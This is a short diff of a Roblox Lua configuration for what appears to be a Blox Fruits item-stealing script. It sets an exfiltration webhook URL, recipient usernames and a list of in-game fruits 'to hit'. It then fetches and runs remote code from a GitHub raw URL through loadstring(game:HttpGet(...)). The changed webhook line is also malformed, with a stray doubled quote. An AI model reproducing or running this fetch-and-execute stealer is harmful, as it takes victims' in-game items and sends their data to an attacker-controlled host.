@@ -1,5 +1,5 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=R2lBT2RqWmVvY3Y5cWkwb0pyOWZQQTpQVWlJeGQtdndNN3lqQUY1bWNQUk9kcmF1ZW1ZdnBmTGpuamhySHFxQ1hVV0YyUlMzNXJjdVJmQ0s2RFFocnE5TmkyN0R4bFNhNVVpM2wzX05BcXNSZ3NEYzRnNXcyMjNzaTVUZG1rcVVmWmFzWTljUFo2dlpvWHBFNFBoV19fYWZHMDBYcnFlRktjbzd4RHRWZUViMWNrRUVxdldUR1RYaVRENVZpV0R6bms" -- << Your Webhook
-Usernames = {"HangNgaruji44743", ""} -- << Your username(-s).
+Webhook = ""https://webhook-protect.vercel.app/api/webhook?id=N1g2RGRTVmZsekU1cTVoRS1QVEdrUTo4aG13RkxHd2s1bHZFYUJBNXVlZ2poOWRQVThPdjgzQnZQR200WkRiTUU2cmpmdU54eTJrZlNjS3Z2N0ItU1FOcjM3UjNqa2tRcDFMVGpEOGJMdTRDZy00U01qS3ZZaGN0SGpCRlBRZkxRcm92X3VGMWxuS3JhUUxqTUNrZGNjS2xwdlpxdzNzVldHQzR0bDNUV2pPSVktV3pSNlIycXhsdXNkVnNuNTZGQTA<< Your Webhook
+Usernames = {"HangNgaruji44743", "eurix16iy"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
